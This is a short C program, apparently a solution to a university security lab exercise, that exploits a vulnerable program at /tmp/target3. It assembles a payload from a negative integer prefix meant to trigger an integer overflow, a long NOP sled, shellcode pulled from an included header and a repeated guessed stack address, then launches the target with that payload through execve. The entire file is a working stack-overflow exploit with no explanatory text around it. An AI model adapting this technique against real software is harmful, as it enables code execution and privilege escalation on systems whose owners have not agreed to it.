#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target3"

#define NUM "-214748124,"

#define NOP "\x90"

#define SP "\xe8\xfb\xff\xbf"

char name[4824] = "";


int main(void)
{
  char *args[3];
  char *env[1];

  strcat(name, NUM);

  int num = 4703;
  //scanf("\n%d", &num);

  int i;
  for(i=0; i<num; i++) {
    strcat(name, NOP);
  }

  strcat(name, shellcode);
  //strcat(name, SP);

  for(i=0; i<20; i++) {
    strcat(name, SP);
  }

  //printf("%s", name);  

  args[0] = TARGET; args[1] = name; args[2] = NULL;
  env[0] = NULL;

  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}

